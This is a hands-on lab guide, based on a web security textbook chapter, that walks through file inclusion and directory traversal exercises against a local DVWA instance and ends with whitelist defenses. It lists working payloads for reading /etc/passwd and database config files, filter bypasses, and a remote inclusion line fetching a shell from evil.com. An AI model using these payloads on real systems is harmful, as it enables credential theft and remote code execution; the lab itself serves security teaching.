# Chapter 4.10: File Inclusion / Directory Traversal — Hands-On Practice

> Based on Chapter 4.10 of **"Safe Web Application Development"** (体系的に学ぶ 安全なWebアプリケーションの作り方) by **Tokumaru Hiroshi**

---

## Prerequisites

- [ ] Docker is running and DVWA container is up
- [ ] Logged into DVWA (admin / password)
- [ ] OWASP ZAP is running and intercepting traffic
- [ ] FoxyProxy is active and routing through ZAP

## What You'll Learn

- Directory traversal using `../` sequences to escape the web root
- Local File Inclusion (LFI) — reading arbitrary server files
- Remote File Inclusion (RFI) — including external malicious files
- Null byte attacks (`%00`) to truncate file extensions
- Reading sensitive server files (`/etc/passwd`, config files, logs)
- Why whitelist-based validation is the only reliable defense

## DVWA Module

**File Inclusion** — Navigate to: `DVWA > File Inclusion`

---

## Exercises

### Low Level

1. Go to **DVWA > File Inclusion**. The page loads with a default included file.

2. Look at the URL in your browser's address bar. You will see something like:

   ```
   http://localhost:4280/vulnerabilities/fi/?page=include.php
   ```

   The application takes a `page` parameter from the URL and directly includes whatever file is specified. There is no validation at all.

3. **Local File Inclusion — Read /etc/passwd:**

   Change the `page` parameter to traverse up to the filesystem root and read the passwd file:

   ```
   ?page=../../../../../../etc/passwd
   ```

   Full URL:
   ```
   http://localhost:4280/vulnerabilities/fi/?page=../../../../../../etc/passwd
   ```

   You should see the contents of `/etc/passwd` displayed directly on the page, mixed in with the normal HTML. This file lists all user accounts on the server.

4. **Try /etc/shadow (access control test):**

   ```
   ?page=../../../../../../etc/shadow
   ```

   This will typically show a warning or permission denied error. The web server process does not have root privileges, so it cannot read the shadow password file. This demonstrates that OS-level access controls still apply — but the application should never have allowed the attempt in the first place.

5. **Read DVWA's own configuration file:**

   ```
   ?page=../../../../../../var/www/html/config/config.inc.php
   ```

   This is especially dangerous. The config file contains the database username, password, and connection details. An attacker who reads this can directly access the database.

6. **Remote File Inclusion (if `allow_url_include` is enabled):**

   If PHP's `allow_url_include` is set to `On`, you can include files from external servers:

   ```
   ?page=http://evil.com/shell.txt
   ```

   The server will fetch and execute the remote file as PHP code. This is the most dangerous form of file inclusion — it allows arbitrary code execution.

   > Note: In modern PHP configurations, `allow_url_include` is off by default. DVWA may or may not have it enabled depending on setup.

---

### Medium Level

Set DVWA Security to **Medium** before proceeding.

1. The application now filters input by stripping `../` and `..\` from the `page` parameter. Try the basic traversal from Low level:

   ```
   ?page=../../../../../../etc/passwd
   ```

   This will fail — the `../` sequences are removed, leaving just `etc/passwd`, which does not exist relative to the include directory.

2. **Bypass with nested traversal:**

   The filter only strips `../` once and does not apply recursively. Use a nested pattern:

   ```
   ?page=..././..././..././..././..././..././etc/passwd
   ```

   When the filter removes `../` from `..././`, the remaining characters form `../` again. The filter has already finished its single pass, so the reconstructed traversal sequence passes through.

3. **Bypass with absolute path:**

   ```
   ?page=/etc/passwd
   ```

   The filter only looks for relative traversal sequences. An absolute path does not contain `../` at all, so it is not affected by the filter.

4. The lesson here is that blacklist-based filtering (removing known-bad patterns) is unreliable. Attackers can almost always find a way around it.

---

### High Level

Set DVWA Security to **High** before proceeding.

1. The application now requires that the `page` parameter starts with the string `file`. Any input that does not begin with `file` is rejected. Try the previous attacks:

   ```
   ?page=../../../../../../etc/passwd        (fails — does not start with "file")
   ?page=/etc/passwd                          (fails — does not start with "file")
   ```

2. **Bypass using the file:// protocol:**

   The `file://` URI scheme starts with the word "file", so it passes the check:

   ```
   ?page=file:///etc/passwd
   ```

   PHP's `include()` supports the `file://` wrapper, so this reads the local file directly using an absolute path.

3. **Alternative bypass — filename starting with "file":**

   ```
   ?page=file/../../../etc/passwd
   ```

   This also starts with "file" and passes the check. The traversal sequences then navigate up from the include directory.

4. This demonstrates that prefix-checking alone is not sufficient. The validation is checking for the wrong thing — it should be checking against a list of allowed values, not checking how the input starts.

---

### Impossible Level

Set DVWA Security to **Impossible** before proceeding.

1. Try every technique from the previous levels:

   ```
   ?page=../../../../../../etc/passwd
   ?page=..././..././etc/passwd
   ?page=/etc/passwd
   ?page=file:///etc/passwd
   ```

   None of them work. Every attempt either shows an error or loads the default page.

2. Click **View Source** to see why. The code uses a strict whitelist:

   ```php
   $file = $_GET['page'];
   if ($file != "include.php" && $file != "file1.php" && $file != "file2.php" && $file != "file3.php") {
       echo "ERROR: File not found!";
       exit;
   }
   ```

   Only four specific filenames are allowed. Any other input is rejected outright. There is no pattern matching, no filtering, no path manipulation — just a simple list of permitted values.

3. **This is the book's strongest recommendation:** use a whitelist of allowed filenames. Never allow user-controlled input to specify file paths directly. The whitelist approach is immune to all traversal techniques because it does not matter what encoding, protocol, or path tricks the attacker uses — if the value is not on the list, it is rejected.

---

## What to Observe in ZAP

While performing these exercises, switch to OWASP ZAP and examine the traffic:

- **Request tab:** Look at the `page` parameter in the URL query string. You can see your traversal path exactly as it was sent.
- **Response tab (Low level):** The response body contains the file contents (e.g., `/etc/passwd` entries) embedded directly within the HTML of the page.
- **Comparison across levels:** At Medium and High levels, observe how the same traversal payloads produce different responses — error messages, blank includes, or filtered paths. Compare the request parameters to understand what the server received versus what you sent.
- **ZAP Alerts:** ZAP's active scanner may flag the `page` parameter as vulnerable to path traversal or file inclusion.

---

## Book Connection

| Exercise | Book Reference |
|---|---|
| `../` directory traversal | Book's `4a-001.php` example — basic path traversal |
| Null byte attack (`%00` to truncate extensions) | Book's technique for bypassing extension checks (e.g., `../../etc/passwd%00`) |
| Whitelist approach (Impossible level) | Book's primary countermeasure recommendation |
| Restricting filenames to alphanumeric characters | Book's secondary defense — reject any filename containing `/`, `\`, `.`, or `%` |
| Remote File Inclusion | Covered in more depth in Chapter 4.13 (File Include Attacks) |

---

## Key Takeaways

1. **File inclusion vulnerabilities are extremely dangerous.** They allow reading sensitive files (credentials, configs, logs) and in the case of RFI, arbitrary code execution.

2. **Blacklist filtering fails.** Removing `../` can be bypassed with nested sequences, encoding tricks, absolute paths, and protocol wrappers. The Medium and High levels both demonstrate this.

3. **Whitelist allowed filenames.** The Impossible level's approach is the correct one. Maintain an explicit list of files that can be included, and reject everything else.

4. **Never use user input directly in file paths.** If you must allow user-selected content, map user input to an internal lookup (e.g., `page=1` maps to `file1.php` internally) instead of using the parameter value as a filename.

5. **Defense in depth matters.** Even with application-level protections, OS-level permissions (like `/etc/shadow` being unreadable) provide an additional layer. But relying solely on OS permissions is not acceptable — the application must enforce its own access controls.
